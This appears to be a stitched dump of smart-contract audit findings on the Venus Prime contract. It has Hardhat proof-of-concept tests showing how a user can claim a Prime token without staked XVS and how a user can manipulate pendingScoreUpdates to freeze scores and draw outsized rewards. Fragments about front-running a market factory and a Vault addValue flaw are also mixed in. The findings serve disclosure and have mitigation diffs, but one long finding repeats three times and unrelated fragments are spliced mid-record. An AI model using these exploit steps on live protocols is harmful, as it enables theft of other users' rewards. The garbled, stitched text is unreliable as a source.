            "detail": "\n# Vulnerability details\n\n## Impact\nWhenever a new Prime token is created, the users `stakedAt` is reset to 0. This happens when the user `claim` a revocable token and when he is `issue` a revocable token, but it does not happen when a user is `issue` an irrevocable token.\n\nThis is `issue()`\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    // We don't reset here.\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                }\n\n                unchecked {\n                    i++;\n                }\n            }\n        } else {\n            for (uint256 i = 0; i < users.length; ) {\n                _mint(false, users[i]);\n                _initializeMarkets(users[i]);\n                \n                // We reset stakedAt here\n                delete stakedAt[users[i]];\n\n                unchecked {\n                    i++;\n                }\n            }\n        }\n    }\n```\nWe can see that when a revocable token is issued and minted the user's `stakedAt` is reset to 0. Whenever a user's token is upgraded, his `stakedAt` has already been reset to 0 inside `claim`.\n\n```javascript\nfunction claim() external {\n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n        \n        // We reset stakedAt here\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n```\n\nThe is only one time when we don't reset the user's `stakedAt` and it's when he is issued an irrevocable token.\n\nLet's see an example and see why this is a problem:\n1. Alice deposits 10k XVS.\n2. The protocol/DAO/admin decides to issue Alice an irrevocable prime token, because she deposited such a large amount of tokens. Keep in mind that the 90 day staking period still hasn't passed and her `stakedAt` is the original time that she deposited 10k XVS.\n3. Time passes and Alice decides to withdraw her entire XVS, so now she has 0 XVS. Her token isn't burned as she has an irrevocable token.\n4. Even more time passes and the protocol/DAO/admin decides to burn Alice's irrevocable token because she is inactive.\n5. EVEN more time passes and Alice returns to the protocol and instead of depositing anything, she calls `claim`.\nHer tx goes through, since her `stakedAt` wasn't reset to 0 when she got issued her irrevocable token.\n\nThis way, Alice claimed a revocable token without having any XVS staked in the contract.\n\n\n## Proof of Concept\nAdd the following line at the top of `tests/hardhat/Prime/Prime.ts`. We'll use this to simulate time passing\n```javascript\nimport { time } from \"@nomicfoundation/hardhat-network-helpers\";\n```\n\nPaste the following inside `tests/hardhat/Prime/Prime.ts` and run `npx hardhat test tests/hardhat/Prime/Prime.ts`.\n```javascript\nit.only(\"User can get Prime token without any XVS staked\", async () => {\n      // User1 deposits 10k XVS\n      await xvs.transfer(await user1.getAddress(), parseUnits(\"10000\", 18));\n      await xvs.connect(user1).approve(xvsVault.address, parseUnits(\"10000\", 18));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, parseUnits(\"10000\", 18));\n      let userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.amount).to.eq(parseUnits(\"10000\", 18));\n\n      // Venus decides to issue an irrevocable Prime token to User1 for staking such a large amount.\n      // Note that the 90 day staking period still hasn't passed\n      await prime.issue(true, [user1.getAddress()]);\n      let token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(true);\n\n      // User1 withdraws her entire balance XVS\n      await xvsVault.connect(user1).requestWithdrawal(xvs.address, 0, parseUnits(\"10000\", 18));\n      userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.pendingWithdrawals).to.eq(parseUnits(\"10000\", 18));\n\n      // User1's Prime token gets burned by protocol\n      await prime.burn(user1.getAddress());\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(false);\n      expect(token.isIrrevocable).to.be.equal(false);\n\n      // 100 days pass\n      await time.increase(8640000);\n\n      // User1 can claim a revocable Prime token without any XVS staked, because his stakedAt wasn't reset to 0\n      expect(prime.stakedAt(await user1.getAddress())).to.not.be.equal(0);\n\n      await prime.connect(user1).claim();\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(false);\n    });\n```\n\n\nIf you are having trouble running the test, this change might fix it. Inside `Prime.sol`, `burn()` remove the access control from the function. This doesn't change the attack and the test outcome.\n```javascript\nfunction burn(address user) external {\n        // _checkAccessAllowed(\"burn(address)\");\n        _burn(user);\n    }\n```\n\n\n## Tools Used\nManual review\nHardhat\n\n## Recommended Mitigation Steps\nReset the user's `stakedAt` whenever he is issued an irrevocable token.\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                    delete stakedAt[users[i]]; \n                }\n          ...\n\n```\n\n\n## Assessed type\n\nOther"

This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther"

This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther"

To mitigate this issue, the contract should enforce that the reference to the depositor's address must match the `msg.sender`, preventing attackers from impersonating victims and creating malicious markets with the victims' funds.",

An attacker can monitor pending transactions to the blockchain and upon identifying a transaction intended for `Factory.createMarket`, they can craft and send a similar transaction with a high gas fee to ensure it gets included in a block ahead of the original. By doing this with malicious parameters, they can divert the victim's deposit to a market they control or one that has undesirable terms.

This potential issue arises because the `Registry` owner can mark any address as a market, which could be exploited by marking a malicious contract as a market. This maliciously marked market could then leverage `Vault#addValue()` to transfer tokens from any address that approved the Vault. The flaw's severity is compounded by the fact that the credited tokens can immediately be withdrawn by the malicious `_beneficiary` via `Vault#withdrawAllAttribution()`.\n\nTo mitigate this risk, the proposed patch ensures that only the address whose tokens are being transferred can call `Vault#addValue()`, thereby barring a market from transferring tokens on behalf of another.

            "detail": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## 